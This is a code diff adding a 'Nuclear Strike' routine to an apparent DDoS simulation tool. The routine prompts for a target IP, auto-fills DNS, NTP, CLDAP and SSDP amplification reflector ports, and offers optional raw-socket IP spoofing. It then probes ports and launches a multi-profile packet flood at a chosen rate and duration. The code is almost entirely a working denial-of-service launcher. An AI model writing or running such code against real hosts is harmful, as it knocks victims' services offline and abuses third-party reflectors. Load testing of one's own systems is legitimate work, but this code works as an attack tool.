+    print("\n=== Nuclear Strike ===")
+    host = _ask("Target IP")
+    port = _ask_int("Port (for TCP/UDP profiles)", 80)
+    
+    # Auto-fill default reflector ports for amplification protocols
+    reflector_ports = {
+        "dns": 53,
+        "ntp": 123,
+        "cldap": 389,
+        "ssdp": 1900,
+    }
+    print("\n--- Amplification Reflector Ports (auto-filled) ---")
+    print(f"  DNS reflector port: {reflector_ports['dns']}")
+    print(f"  NTP reflector port: {reflector_ports['ntp']}")
+    print(f"  CLDAP reflector port: {reflector_ports['cldap']}")
+    print(f"  SSDP reflector port: {reflector_ports['ssdp']}")
+    print("  (Press Enter to use defaults, or enter custom values)")
+    reflector_ports["dns"] = _ask_int("DNS reflector port", reflector_ports["dns"])
+    reflector_ports["ntp"] = _ask_int("NTP reflector port", reflector_ports["ntp"])
+    reflector_ports["cldap"] = _ask_int("CLDAP reflector port", reflector_ports["cldap"])
+    reflector_ports["ssdp"] = _ask_int("SSDP reflector port", reflector_ports["ssdp"])
+    
+    pps = _ask_int("PPS per profile", 500)
+    duration = _ask_float("Duration (s)", 60)
+
+    # Spoofing is off by default (non-spoofed, real source IP).
+    # Spoofed variants require raw socket privileges and are for controlled
+    # reflection testing only. Default is non-spoofed (real source IP).
+    enable_spoofing = _ask_yes_no(
+        "Enable IP spoofing for raw profiles? (requires root/CAP_NET_RAW)",
+        default=False,
+    )
+
+    # Check privileges
+    is_admin, parent_raw = check_privileges()
+    child_raw, child_reason = check_child_raw_capability()
+    profiles = build_profiles(host, port, reflector_ports, enable_spoofing=enable_spoofing)
+
+    if not (is_admin and parent_raw):
+        print("\n[!] Not running as Administrator or raw sending unavailable")
+        print(f"   Reason: {raw_capability().reason}")
+        if not child_raw:
+            print(f"   Child check also failed: {child_reason}")
+        before = len(profiles)
+        profiles = [p for p in profiles if not p.requires_admin]
+        print(
+            f"   Skipping {before - len(profiles)} raw profiles, "
+            f"running {len(profiles)} socket profiles\n"
+        )
+    elif not child_raw:
+        print("\n[!] This process is elevated, but a spawned child cannot send raw packets")
+        print(f"   Child reason: {child_reason}")
+        print("   This happens when the PyInstaller re-exec does not preserve elevation.")
+        print("   Raw profiles will fail silently; skipping them for this run.")
+        before = len(profiles)
+        profiles = [p for p in profiles if not p.requires_admin]
+        print(
+            f"   Skipping {before - len(profiles)} raw profiles, "
+            f"running {len(profiles)} socket profiles\n"
+        )
+
+    # Only after the privilege filter: a port probe against a host we cannot
+    # even address would report every profile closed and be mistaken for a
+    # reason to run none of them.
+    profiles, closed = filter_available_profiles(profiles, host)
+    if closed:
+        print("\n[!] Nothing is listening on these ports, so the packets would be")
+        print("    discarded before reaching any application. Skipping:")
+        for name, reason in closed:
+            print(f"      - {name}: {reason}")
+        print()
+
+    # Check reflector ports for amplification profiles
+    amp_profiles_by_protocol = {
+        "dns": [p for p in profiles if p.profile == ProfileName.DNS_AMPLIFICATION],
+        "ntp": [p for p in profiles if p.profile == ProfileName.NTP_AMPLIFICATION],
+        "cldap": [p for p in profiles if p.profile == ProfileName.CLDAP_AMPLIFICATION],
+        "ssdp": [p for p in profiles if p.profile == ProfileName.SSDP_AMPLIFICATION],
+    }
+    
+    from ddosim.nuclear import probe_udp_port
+    for protocol, profiles_list in amp_profiles_by_protocol.items():
+        if not profiles_list:
+            continue
+        port = reflector_ports.get(protocol)
+        if not port:
+            continue
+        reflector_open = probe_udp_port(host, port)
+        if not reflector_open:
+            print(f"\n[!] WARNING: {protocol.upper()} reflector port {port} on {host} appears closed.")
+            print(f"    {protocol.upper()} amplification requires a valid open reflector on port {port}.")
+            print("    Without a valid reflector, this profile will only send requests at")
+            print("    low rate with no amplification.")
+            print()
+            proceed = _ask_yes_no(f"Continue {protocol.upper()} amplification anyway?", default=False)
+            if not proceed:
+                print("Exiting.")
+                return 1
+
+    if not profiles:
+        print("No profiles available to run. Exiting.")
+        return 1
+
+    aggregator = NuclearAggregator(
+        profiles=profiles,
+        target_ip=host,
+        pps=pps,
+        duration=duration,
+        payload_size=512,
+        workers=4,
+    )
+
+    return aggregator.run()
